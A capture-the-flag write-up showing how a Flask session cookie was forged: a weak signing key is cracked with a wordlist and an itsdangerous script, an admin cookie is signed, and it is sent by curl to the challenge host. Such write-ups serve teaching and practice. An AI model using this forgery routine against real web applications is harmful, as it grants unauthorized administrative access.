# InIt CTF — Super Cookie (Web, 100 pts)

- **Category:** Web (Flask session forgery)
- **Target:** `http://172.198.60.104:3000` (gunicorn)
- **Description:** Story archive with a restricted admin area. "The cookie is
  unsafe somewhere."

## Flag

```
InIt{C00k1e_F0rg3ry_1s_Sup3r}
```

## Solution

**1. Recon** — `/robots.txt` leaks the hidden admin path:

```
Disallow: /admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

**2. Cookie triage** — visiting it drops a Flask session cookie:

```
session=eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6InZpc2l0b3IifQ.avhYEg.dN9EVPo6K6BzT6SeIyUmCZjMW4s
→ {"role":"guest","username":"visitor"}   (signed, not encrypted)
```

**3. Crack the signing key** — custom itsdangerous checker against
`rockyou.txt` (flask-unsign was misbehaving locally):

```python
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer(secret_key=key, salt='cookie-session',
    signer_kwargs={'key_derivation':'hmac','digest_method':'sha1'})
s.loads(COOKIE)   # try keys; hit after ~17k candidates
```

Found: **`secret123`**

**4. Forge admin:**

```python
s.dumps({"role":"admin","username":"admin"})
# eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.avhYSA.k1u5aftM1qhh3nG-Tr5NloWKhhg
```

```bash
curl -s http://172.198.60.104:3000/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311 \
  -H "Cookie: session=<forged>"     # → Admin panel unlocked + flag
```

Once the HMAC key is weak, the `role` claim is client-authored.
